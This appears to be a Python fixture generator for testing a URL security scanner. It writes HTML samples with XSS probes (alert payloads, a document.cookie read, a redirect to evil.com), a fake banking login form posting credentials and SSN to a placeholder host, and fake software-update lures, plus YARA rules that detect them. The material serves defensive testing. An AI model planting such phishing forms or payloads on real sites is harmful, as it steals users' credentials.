#!/usr/bin/env python3
"""Generator for test content that should trigger YARA rules and security scanners."""

import os
import tempfile
from typing import Dict, List


class MaliciousContentGenerator:
    """Generates test content that should be detected by security scanners."""

    def __init__(self):
        """Initialize the content generator."""
        self.temp_files = []

    def cleanup(self):
        """Clean up temporary files."""
        for file_path in self.temp_files:
            try:
                os.unlink(file_path)
            except OSError:
                pass
        self.temp_files.clear()

    def create_xss_html(self) -> str:
        """Create HTML content with XSS patterns that YARA should detect."""
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Test Page</title>
</head>
<body>
    <h1>Welcome to our site</h1>
    <p>This is a test page with some content.</p>

    <!-- These patterns should trigger XSS detection -->
    <script>alert('xss')</script>
    <img src="x" onerror="alert('xss')">
    <iframe src="javascript:alert('xss')"></iframe>
    <svg onload="alert('xss')"></svg>
    <body onload="alert('xss')">

    <!-- Additional suspicious patterns -->
    <script>document.cookie</script>
    <script>window.location='http://evil.com'</script>
    <script>eval(atob('YWxlcnQoInhzcyIp'))</script>

    <p>End of content</p>
</body>
</html>"""

        # Create temporary file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".html", delete=False) as f:
            f.write(html_content)
            temp_path = f.name

        self.temp_files.append(temp_path)
        return temp_path

    def create_phishing_html(self) -> str:
        """Create HTML content with phishing patterns."""
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Secure Banking Login</title>
</head>
<body>
    <h1>Online Banking</h1>
    <p>Please enter your credentials to access your account</p>

    <!-- Suspicious login forms -->
    <form action="http://suspicious-site.com/collect.php" method="post">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="text" name="ssn" placeholder="Social Security Number">
        <input type="text" name="pin" placeholder="PIN">
        <input type="submit" value="Login">
    </form>

    <!-- Suspicious links -->
    <a href="http://bit.ly/suspicious">Click here to verify your account</a>
    <a href="data:text/html,<script>alert('gotcha')</script>">Update Profile</a>

    <!-- Fake security messages -->
    <div style="color: red; font-weight: bold;">
        WARNING: Your account will be suspended unless you verify immediately!
    </div>

</body>
</html>"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".html", delete=False) as f:
            f.write(html_content)
            temp_path = f.name

        self.temp_files.append(temp_path)
        return temp_path

    def create_malware_download_html(self) -> str:
        """Create HTML content that simulates malware download patterns."""
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Software Update Required</title>
</head>
<body>
    <h1>Critical Update Available</h1>

    <!-- Suspicious download links -->
    <a href="http://updates.example.com/flash_update.exe">Download Flash Update</a>
    <a href="http://security-update.net/windows_patch.scr">Security Patch</a>
    <a href="mailto:attacker@evil.com?subject=SendMe&body=YourPassword">Contact Support</a>

    <!-- Auto-download patterns -->
    <iframe src="http://malware.example.com/exploit.html" style="display:none;"></iframe>

    <!-- Suspicious file extensions -->
    <script>
        window.open('http://downloads.example.com/setup.exe');
        window.open('http://files.example.com/document.scr');
        window.open('http://media.example.com/video.bat');
    </script>

    <!-- Base64 encoded suspicious content -->
    <script>
        var malicious = atob('ZXZhbChhbGVydCgibWFsd2FyZSIpKQ==');
        // This decodes to: eval(alert("malware"))
    </script>
</body>
</html>"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".html", delete=False) as f:
            f.write(html_content)
            temp_path = f.name

        self.temp_files.append(temp_path)
        return temp_path

    def create_benign_html(self) -> str:
        """Create completely benign HTML content for comparison."""
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Welcome to Our Website</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <header>
        <h1>Welcome to Example Corporation</h1>
        <nav>
            <ul>
                <li><a href="/about">About Us</a></li>
                <li><a href="/services">Services</a></li>
                <li><a href="/contact">Contact</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <section>
            <h2>Our Services</h2>
            <p>We provide high-quality web development services to businesses worldwide.</p>
            <ul>
                <li>Web Design</li>
                <li>Application Development</li>
                <li>Consulting Services</li>
            </ul>
        </section>

        <section>
            <h2>Contact Information</h2>
            <p>Email: info@example-corp.com</p>
            <p>Phone: (555) 123-4567</p>
            <p>Address: 123 Business St, City, State 12345</p>
        </section>
    </main>

    <footer>
        <p>&copy; 2024 Example Corporation. All rights reserved.</p>
    </footer>
</body>
</html>"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".html", delete=False) as f:
            f.write(html_content)
            temp_path = f.name

        self.temp_files.append(temp_path)
        return temp_path

    def get_test_yara_rules(self) -> str:
        """Create YARA rules that will detect the malicious patterns."""
        yara_rules = """
rule DetectXSS {
    meta:
        description = "Detects XSS patterns in web content"
        author = "URL Checker Test Suite"

    strings:
        $xss1 = "<script>alert("
        $xss2 = "onerror=\"alert("
        $xss3 = "javascript:alert("
        $xss4 = "onload=\"alert("
        $xss5 = "document.cookie"
        $xss6 = "eval(atob("

    condition:
        any of ($xss*)
}

rule DetectPhishing {
    meta:
        description = "Detects phishing patterns"
        author = "URL Checker Test Suite"

    strings:
        $phish1 = "username" nocase
        $phish2 = "password" nocase
        $phish3 = "Social Security" nocase
        $phish4 = "account will be suspended" nocase
        $phish5 = "verify immediately" nocase
        $phish6 = "bit.ly"

    condition:
        3 of ($phish*)
}

rule DetectMalwareDownload {
    meta:
        description = "Detects malware download patterns"
        author = "URL Checker Test Suite"

    strings:
        $mal1 = ".exe"
        $mal2 = ".scr"
        $mal3 = ".bat"
        $mal4 = "flash_update"
        $mal5 = "security_patch"
        $mal6 = "window.open("
        $mal7 = "exploit.html"

    condition:
        any of ($mal*)
}
"""

        # Create temporary YARA rules file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yar", delete=False) as f:
            f.write(yara_rules)
            temp_path = f.name

        self.temp_files.append(temp_path)
        return temp_path

    def get_benign_test_sites(self) -> List[str]:
        """Return list of known benign sites for testing."""
        return [
            "https://www.google.com",
            "https://github.com",
            "https://www.wikipedia.org",
            "https://httpbin.org/get",  # Useful for HTTP testing
            "https://example.com",  # RFC-designated example domain
        ]

    def create_mock_api_responses(self) -> Dict[str, Dict]:
        """Create realistic mock responses for external API services."""
        return {
            "virustotal_malicious": {
                "attributes": {
                    "stats": {
                        "malicious": 15,
                        "suspicious": 3,
                        "harmless": 45,
                        "timeout": 2,
                        "undetected": 10,
                    }
                },
                "id": "test_scan_id_malicious",
            },
            "virustotal_clean": {
                "attributes": {
                    "stats": {
                        "malicious": 0,
                        "suspicious": 0,
                        "harmless": 68,
                        "timeout": 1,
                        "undetected": 6,
                    }
                },
                "id": "test_scan_id_clean",
            },
            "urlscan_malicious": {
                "uuid": "test-uuid-malicious",
                "result": "https://urlscan.io/result/test-uuid-malicious/",
                "api": "https://urlscan.io/api/v1/result/test-uuid-malicious/",
                "visibility": "public",
                "options": {},
                "url": "http://malicious-test-site.com",
                "country": "US",
                "server": "nginx/1.18",
                "city": "San Francisco",
                "ip": "1.2.3.4",
                "overall": {"malicious": True, "hasVerdicts": 15},
            },
            "urlscan_clean": {
                "uuid": "test-uuid-clean",
                "result": "https://urlscan.io/result/test-uuid-clean/",
                "api": "https://urlscan.io/api/v1/result/test-uuid-clean/",
                "visibility": "public",
                "options": {},
                "url": "https://www.google.com",
                "country": "US",
                "server": "gws",
                "city": "Mountain View",
                "ip": "8.8.8.8",
                "overall": {"malicious": False, "hasVerdicts": 2},
            },
            "google_sb_malicious": {
                "https://malicious-test-site.com": {
                    "malicious": True,
                    "threats": ["MALWARE", "PHISHING"],
                    "platforms": ["WINDOWS", "LINUX", "OSX"],
                    "cache": "300s",
                }
            },
            "google_sb_clean": {
                "https://www.google.com": {
                    "malicious": False,
                    "threats": [],
                    "platforms": [],
                    "cache": "3600s",
                }
            },
        }


def create_content_generator() -> MaliciousContentGenerator:
    """Factory function to create a content generator."""
    return MaliciousContentGenerator()
